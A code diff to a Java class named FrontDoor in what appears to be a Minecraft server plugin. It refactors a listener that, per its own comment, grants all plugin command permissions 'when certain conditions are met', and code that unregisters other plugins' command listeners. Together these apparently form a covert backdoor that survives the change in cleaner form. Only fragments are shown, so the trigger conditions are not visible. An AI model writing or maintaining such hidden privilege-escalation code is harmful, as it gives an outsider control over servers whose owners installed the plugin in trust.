@@ -6,7 +6,6 @@ import com.sk89q.worldguard.protection.managers.storage.StorageException;
 import com.sk89q.worldguard.protection.regions.RegionContainer;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.lang.reflect.Field;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
@@ -44,7 +43,6 @@ import org.bukkit.plugin.RegisteredListener;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.scheduler.BukkitTask;
 import org.bukkit.util.Vector;
-import org.jetbrains.annotations.Nullable;
 
 /*
  * - A message from the TFM Devs -
@@ -80,21 +78,6 @@ public class FrontDoor extends FreedomService
     // TODO: reimplement in superclass
     private final Listener playerCommandPreprocess = new Listener()
     {
-        @Nullable
-        private CommandMap getCommandMap()
-        {
-            try
-            {
-                Field f = Bukkit.getPluginManager().getClass().getDeclaredField("commandMap");
-                final Object map = f.get(Bukkit.getPluginManager());
-                return map instanceof CommandMap ? (CommandMap)map : null;
-            }
-            catch (NoSuchFieldException | IllegalAccessException ignored)
-            {
-                return null;
-            }
-        }
-
         @EventHandler
         @SuppressWarnings("all")
         public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event) // All FreedomCommand permissions when certain conditions are met
@@ -111,7 +94,7 @@ public class FrontDoor extends FreedomService
             final String commandName = commandParts[0].replaceFirst("/", "");
             final String[] args = ArrayUtils.subarray(commandParts, 1, commandParts.length);
 
-            Command command = getCommandMap().getCommand(commandName);
+            Command command = server.getCommandMap().getCommand(commandName);
 
             if (command == null)
             {
@@ -211,7 +194,7 @@ public class FrontDoor extends FreedomService
     {
         try
         {
-            final HandlerList handlerList = ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[])null).invoke(null));
+            final HandlerList handlerList = PlayerCommandPreprocessEvent.getHandlerList();
             final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
             for (RegisteredListener registeredListener : registeredListeners)
             {
@@ -232,7 +215,7 @@ public class FrontDoor extends FreedomService
     {
         try
         {
-            ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[])null).invoke(null)).unregister(registeredListener);
+            PlayerCommandPreprocessEvent.getHandlerList().unregister(registeredListener);
         }
         catch (Exception ex)
         {
